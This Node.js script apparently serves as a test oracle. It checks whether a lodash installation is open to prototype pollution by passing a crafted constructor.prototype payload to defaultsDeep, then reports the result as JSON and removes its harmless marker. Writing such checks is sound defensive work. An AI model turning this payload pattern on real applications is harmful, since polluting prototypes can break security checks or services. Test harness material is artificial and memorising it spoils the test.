'use strict';
const path = require('node:path');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function finish() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

try {
  const _ = require(path.join('/consumer', 'node_modules', 'lodash'));

  if (typeof _.defaultsDeep !== 'function') {
    evidence = 'lodash.defaultsDeep is not a function; module resolution or API mismatch';
    finish();
    process.exit(0);
  }

  // Benign operation first: verify defaultsDeep works as expected for normal merging.
  let benignResult;
  try {
    const target = { a: 1 };
    const source = { b: { c: 2 } };
    benignResult = _.defaultsDeep(target, source);
    if (!benignResult || benignResult.a !== 1 || !benignResult.b || benignResult.b.c !== 2) {
      evidence = 'Benign defaultsDeep call did not produce expected merged object';
      finish();
      process.exit(0);
    }
  } catch (benignErr) {
    evidence = 'Benign defaultsDeep call threw an exception: ' + String(benignErr && benignErr.message);
    finish();
    process.exit(0);
  }

  // Benign call succeeded.
  operation_completed = true;

  // Marker property name, unique-ish, to check for prototype pollution.
  const marker = 'polluted_marker_' + Date.now();

  // Ensure clean baseline: Object.prototype should not already have this property.
  if (Object.prototype[marker] !== undefined) {
    evidence = 'Pre-existing pollution marker detected before exploit attempt; aborting';
    finish();
    process.exit(0);
  }

  let exploitThrew = false;
  let exploitErrorMessage = '';

  try {
    const maliciousPayload = JSON.parse(
      '{"constructor": {"prototype": {"' + marker + '": true}}}'
    );
    // Trigger the prototype pollution via defaultsDeep.
    _.defaultsDeep({}, maliciousPayload);
  } catch (exploitErr) {
    exploitThrew = true;
    exploitErrorMessage = String(exploitErr && exploitErr.message);
  }

  // Check whether Object.prototype got polluted.
  const pollutedValue = Object.prototype[marker];
  const freshObjectHasMarker = ({})[marker] === true;

  if (pollutedValue === true || freshObjectHasMarker) {
    exploit_succeeded = true;
    evidence = 'Object.prototype.' + marker + ' was set to true via defaultsDeep({constructor:{prototype:{...}}}) payload; new plain objects now inherit it';
  } else {
    exploit_succeeded = false;
    if (exploitThrew) {
      evidence = 'defaultsDeep call with malicious payload threw (' + exploitErrorMessage + ') and Object.prototype was not polluted; behavior appears patched';
    } else {
      evidence = 'defaultsDeep call with malicious payload completed without throwing, and Object.prototype.' + marker + ' remains undefined; prototype pollution did not occur';
    }
  }

  // Cleanup in case pollution partially occurred, to avoid leaking state (best effort).
  try {
    delete Object.prototype[marker];
  } catch (cleanupErr) {
    // ignore cleanup errors
  }

  finish();
} catch (fatalErr) {
  operation_completed = false;
  exploit_succeeded = false;
  evidence = 'Unexpected fatal exception during setup or execution: ' + String(fatalErr && fatalErr.message);
  finish();
}
